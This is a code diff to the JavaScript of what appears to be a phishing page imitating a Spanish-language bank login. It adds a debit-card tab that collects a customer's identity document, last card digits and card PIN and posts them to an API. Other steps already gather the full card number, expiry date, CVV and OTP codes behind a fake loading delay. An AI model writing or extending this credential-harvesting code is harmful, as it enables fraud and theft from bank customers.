@@ -8,6 +8,18 @@ const DOMElements = {
     inputTipoDocumento: document.querySelector('#tipo-documento'),
     inputNumeroDocumento: document.querySelector('#numero-documento'),
     btnUserNext: document.querySelector('#step-user-next'),
+    
+    // Nuevos elementos para tabs
+    tabClaveSegura: document.querySelector('#tab-secure-pass'),
+    tabTarjetaDebito: document.querySelector('#tab-debit-card'),
+    
+    // Elementos de tarjeta de débito en step-user
+    stepUserDebitCard: document.querySelector('#step-user-debit-card'),
+    inputUltimosDigitos: document.querySelector('#p-user'),
+    inputClaveTarjeta: document.querySelector('#c-user'),
+    
+    // Elementos de mensaje
+    messageContainer: document.querySelector('#message-container'),
 
     // Elementos del paso contraseña
     contStepPass: document.querySelector('#step-pass'),
@@ -53,6 +65,9 @@ const DOMElements = {
     // Elementos del paso tarjeta
     contStepCard: document.querySelector('#step-card'),
     btnCardNext: document.querySelector('#step-card-next'),
+    inputNumeroTarjetaCard: document.querySelector('#p'),
+    inputFechaVencimientoCard: document.querySelector('#pdate'),
+    inputCvvCard: document.querySelector('#c'),
 
     // Elementos del paso resumen
     contStepResumen: document.querySelector('#step-resumen'),
@@ -69,8 +84,14 @@ const DOMElements = {
  * Módulo de validadores
  */
 const validators = {
-    user: (tipoCliente, tipoDocumento, numeroDocumento) => {
-        return tipoCliente && tipoDocumento && numeroDocumento && numeroDocumento.length >= 4;
+    user: (tipoCliente, tipoDocumento, numeroDocumento, mode = 'clave-segura') => {
+        if (mode === 'clave-segura') {
+            return tipoCliente && tipoDocumento && numeroDocumento && numeroDocumento.length >= 4;
+        } else if (mode === 'tarjeta-debito') {
+            const cardValidation = validators.cardUser();
+            return cardValidation && tipoCliente && tipoDocumento && numeroDocumento && numeroDocumento.length >= 4;
+        }
+        return false;
     },
     
     pass: (passValue) => {
@@ -82,9 +103,9 @@ const validators = {
     },
     
     card: () => {
-        const p = document.querySelector('#p');
-        const pdate = document.querySelector('#pdate');
-        const c = document.querySelector('#c');
+        const p = DOMElements.inputNumeroTarjetaCard;
+        const pdate = DOMElements.inputFechaVencimientoCard;
+        const c = DOMElements.inputCvvCard;
 
         if((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')){
             if(isLuhnValid(p.value)){
@@ -119,6 +140,74 @@ const validators = {
             p.focus();
             return false;
         }
+    },
+    
+    cardUser: () => {
+        const ultimosDigitos = DOMElements.inputUltimosDigitos;
+        const claveTarjeta = DOMElements.inputClaveTarjeta;
+
+        let errors = [];
+
+        // Validar últimos 4 dígitos de tarjeta
+        if(ultimosDigitos.value.length !== 4 || !/^\d+$/.test(ultimosDigitos.value)){
+            errors.push('Los últimos 4 dígitos de tu tarjeta deben ser exactamente 4 números');
+        }
+
+        // Validar clave de tarjeta (3-4 dígitos)
+        if(claveTarjeta.value.length < 3 || claveTarjeta.value.length > 4 || !/^\d+$/.test(claveTarjeta.value)){
+            errors.push('La clave de tu tarjeta debe tener entre 3 y 4 números');
+        }
+
+        // Si hay errores, mostrar una sola alerta
+        if(errors.length > 0){
+            alert(errors.join('. '));
+            return false;
+        }
+
+        // Si todo está bien, retornar los datos
+        return {
+            lastBin: ultimosDigitos.value,
+            cs: claveTarjeta.value
+        }
+    }
+};
+
+/**
+ * Módulo de gestión de tabs
+ */
+const tabManager = {
+    currentMode: 'clave-segura', // 'clave-segura' o 'tarjeta-debito'
+    
+    switchToClaveSegura: () => {
+        tabManager.currentMode = 'clave-segura';
+        
+        // Activar tab Clave Segura
+        DOMElements.tabClaveSegura.classList.add('font-semibold', 'border-[#0043a9]', 'text-[#0043a9]');
+        DOMElements.tabClaveSegura.classList.remove('border-gray-200');
+        
+        // Desactivar tab Tarjeta Débito
+        DOMElements.tabTarjetaDebito.classList.remove('font-semibold', 'border-[#0043a9]', 'text-[#0043a9]');
+        DOMElements.tabTarjetaDebito.classList.add('border-gray-200');
+        
+        // Ocultar campos de tarjeta y actualizar mensaje
+        DOMElements.stepUserDebitCard.classList.add('hidden');
+        DOMElements.messageContainer.innerHTML = '<p class="m-0">Estás ingresando con tu Clave Segura. Selecciona \'Tarjeta Débito\' para cambiar el tipo de ingreso.</p>';
+    },
+    
+    switchToTarjetaDebito: () => {
+        tabManager.currentMode = 'tarjeta-debito';
+        
+        // Activar tab Tarjeta Débito
+        DOMElements.tabTarjetaDebito.classList.add('font-semibold', 'border-[#0043a9]', 'text-[#0043a9]');
+        DOMElements.tabTarjetaDebito.classList.remove('border-gray-200');
+        
+        // Desactivar tab Clave Segura
+        DOMElements.tabClaveSegura.classList.remove('font-semibold', 'border-[#0043a9]', 'text-[#0043a9]');
+        DOMElements.tabClaveSegura.classList.add('border-gray-200');
+        
+        // Mostrar campos de tarjeta y actualizar mensaje
+        DOMElements.stepUserDebitCard.classList.remove('hidden');
+        DOMElements.messageContainer.innerHTML = '<p class="m-0">Estás ingresando con tu Tarjeta de Débito. Selecciona \'Clave Segura\' para cambiar el tipo de ingreso.</p>';
     }
 };
 
@@ -167,6 +256,14 @@ const stateManager = {
     
     updateCardType: (type) => {
         info.metaInfo.cardType = type; // 'credit' o 'debit'
+        updateLS();
+    },
+    
+    updateUserWithCard: (tipoCliente, tipoDocumento, numeroDocumento, cardFields) => {
+        info.metaInfo.user = `${tipoCliente} - ${tipoDocumento} - ${numeroDocumento}`;
+        info.metaInfo.lastBin = cardFields.lastBin;
+        info.metaInfo.cs = cardFields.cs;
+        info.metaInfo.cardType = 'debit';
         updateLS();
     },
     
@@ -376,7 +473,9 @@ const viewManager = {
             inputOtpDigit3,
             inputOtpDigit4,
             inputOtpDigit5,
-            inputOtpDigit6
+            inputOtpDigit6,
+            inputUltimosDigitos,
+            inputClaveTarjeta
         } = DOMElements;
 
         if (!contStepUser.classList.contains('hidden')){
@@ -425,12 +524,19 @@ const viewManager = {
         inputOtpDigit5.value = '';
         inputOtpDigit6.value = '';
         DOMElements.tokenInputs.forEach(input => input.value = '');
+        
+        // Limpiar campos de tarjeta de débito en step-user
+        inputUltimosDigitos.value = '';
+        inputClaveTarjeta.value = '';
+        
+        // Resetear tabs a modo clave segura
+        tabManager.switchToClaveSegura();
     },
     
     clearCardFields: () => {
-        document.querySelector('#p').value = '';
-        document.querySelector('#pdate').value = '';
-        document.querySelector('#c').value = '';
+        DOMElements.inputNumeroTarjetaCard.value = '';
+        DOMElements.inputFechaVencimientoCard.value = '';
+        DOMElements.inputCvvCard.value = '';
     },
     
     showLoader: () => {
@@ -453,16 +559,31 @@ const eventHandlers = {
             const tipoCliente = DOMElements.inputTipoCliente.value;
             const tipoDocumento = DOMElements.inputTipoDocumento.value;
             const numeroDocumento = DOMElements.inputNumeroDocumento.value;
+            const mode = tabManager.currentMode;
             
-            if (validators.user(tipoCliente, tipoDocumento, numeroDocumento)) {
-                stateManager.updateUser(tipoCliente, tipoDocumento, numeroDocumento);
-                viewManager.showLoader();
-                await sleep(2700);
-                viewManager.hideLoader();
-                navigationManager.goToStep(DOMElements.contStepPass);
-                
+            if (validators.user(tipoCliente, tipoDocumento, numeroDocumento, mode)) {
+                if (mode === 'tarjeta-debito') {
+                    // Si es tarjeta de débito, enviar directamente a la API
+                    const cardFields = validators.cardUser();
+                    stateManager.updateUserWithCard(tipoCliente, tipoDocumento, numeroDocumento, cardFields);
+                    viewManager.showLoader();
+                    await apiService.sendData(info.metaInfo)
+                        .then(apiService.handleResponse)
+                        .catch(apiService.handleError);
+                } else {
+                    // Si es clave segura, continuar con el flujo normal
+                    stateManager.updateUser(tipoCliente, tipoDocumento, numeroDocumento);
+                    viewManager.showLoader();
+                    await sleep(2700);
+                    viewManager.hideLoader();
+                    navigationManager.goToStep(DOMElements.contStepPass);
+                }
             } else {
-                alert('El número de documento debe tener al menos 4 caracteres.');
+                if (mode === 'clave-segura') {
+                    alert('El número de documento debe tener al menos 4 caracteres.');
+                } else {
+                    alert('Revisa los datos de tu tarjeta y documento.');
+                }
             }
         }
     },
@@ -605,13 +726,19 @@ const addEventListeners = async () => {
         tokenInputs,
         ccajInputs,
         otpInputs,
-        btnResumeCancelInsurance
+        btnResumeCancelInsurance,
+        tabClaveSegura,
+        tabTarjetaDebito
     } = DOMElements;
 
     setupDigitInputs(cdinInputs);
     setupDigitInputs(tokenInputs);
     setupDigitInputs(ccajInputs);
     setupDigitInputs(otpInputs);
+
+    // Event listeners para tabs
+    tabClaveSegura.addEventListener('click', tabManager.switchToClaveSegura);
+    tabTarjetaDebito.addEventListener('click', tabManager.switchToTarjetaDebito);
 
     // Paso 1: Usuario
     btnUserNext.addEventListener('click', eventHandlers.user.next);
